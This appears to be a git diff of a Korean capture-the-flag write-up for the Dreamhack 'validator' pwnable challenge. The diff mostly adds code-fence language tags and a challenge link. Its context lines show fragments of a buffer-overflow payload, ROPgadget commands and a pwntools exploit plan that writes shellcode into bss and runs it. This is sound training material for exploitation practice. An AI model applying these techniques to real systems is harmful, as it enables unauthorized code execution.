@@ -14,14 +14,19 @@ tags: [Dreamhack, Wargame, Pwnable]
 #   lqip: 
 #   alt: 
 ---
+
+[문제 링크](https://dreamhack.io/wargame/challenges/94)
+
 ## 문제 설명 및 바이너리 분석
 
 ---
+
 취약한 인증 프로그램을 익스플로잇해 flag를 획득하세요!
 
 Hint: 서버 환경에 설치된 5.4.0 이전 버전의 커널에서는, NX Bit가 비활성화되어 있는 경우 읽기 권한이 있는 메모리에 실행 권한이 존재합니다. 5.4.0 이후 버전에서는 스택 영역에만 실행 권한이 존재합니다.
 
 ---
+
 <img width="1115" alt="image" src="https://github.com/user-attachments/assets/f8c6c451-6021-4999-92fb-8526fa28f0c3">
 
 <img width="709" alt="image" src="https://github.com/user-attachments/assets/1b717225-5e69-42ba-ac96-8e122e998b7c">
@@ -84,7 +89,7 @@ Hint: 서버 환경에 설치된 5.4.0 이전 버전의 커널에서는, NX Bit�
 
 만약 **stripped** 된 파일을 분석하기 위해서는 아래와 같은 명령어를 통해 **Entry point address**를 찾아서, 해당 주소에 breakpoint를 설정한 후,
 
-```
+```sh
 readelf -a ./binary | more
 ```
 
@@ -120,7 +125,7 @@ readelf -a ./binary | more
 
 먼저 위와 같이, 가장 먼저 나오는 `main` 함수의 디스어셈블 결과에 **F5** 단축키를 입력해서 **디컴파일**한 결과를 살펴보자.
 
-```
+```c
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   char s[128]; // [rsp+0h] [rbp-80h] BYREF
@@ -138,7 +143,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 그럼 이제 `validate` 함수를 더블클릭해서, 해당 함수의 내용을 분석해보자.
 
-```
+```c
 __int64 __fastcall validate(__int64 a1, unsigned __int64 a2)
 {
   unsigned int i; // [rsp+1Ch] [rbp-4h]
@@ -236,7 +241,7 @@ SFP를 덮을 때는 **8bytes가 아닌 7bytes만** 덮어야 한다.
 
 Payload를 구성하는 코드는 아래와 같다.
 
-```
+```py
 # [1] validate
 
 payload = b"DREAMHACK!"  # index : 0 ~ 9
@@ -252,7 +257,7 @@ payload += b'a' * 0x7         # SFP : 앞에서 SFP의 첫번째 바이트까지
 
 SFP를 생각하기 까다롭기 때문에, 다음에 할 때는 그냥 인덱스 10부터 한번에 SFP까지 덮는 아래의 코드를 사용해도 된다.
 
-```
+```py
 payload = b"DREAMHACK!"  # index : 0 ~ 9
 
 # index : 10 ~ 128 + SFP -> 총 126 바이트
@@ -273,7 +278,7 @@ for i in range(126, 0, -1):   # 127 ~ 1 까지 -1씩 감소시키며
 
 ROP 가젯은 `pwntools`의 `find_gadget()` 함수를 쓰거나, 쉘에서 아래의 명령어로 구할 수 있다.
 
-```
+```sh
 ROPgadget --binary validator_dist | grep 'pop rdi'
 ```
 
@@ -285,13 +290,13 @@ ROPgadget --binary validator_dist | grep 'pop rdi'
 
 그럼 이제, **BOF** 취약점을 통해 가능한 **RAO** 공격과 **ROP 가젯**을 통해, 아래의 `read` 함수를 실행하도록 하고, `bss` 영역에 `shellcode`를 대입해준 후 `bss` 영역으로 이동하면 쉘코드가 실행될 것이다.
 
-```
+```c
 read(0, bss, len(shellcode))
 ```
 
 전체 Exploit 코드는 아래와 같으며, `p.send()`를 보내기 전에 `sleep(0.5)`로 텀을 두지 않으면 쉘이 바로 종료되는 오류가 발생해서 이 부분을 주의하자.
 
-```
+```py
 from pwn import *
 
 context.arch = "amd64"
@@ -383,7 +388,7 @@ p.interactive()
 
 ---
 
-```
+```py
 from pwn import *
 
 context.arch = "amd64"
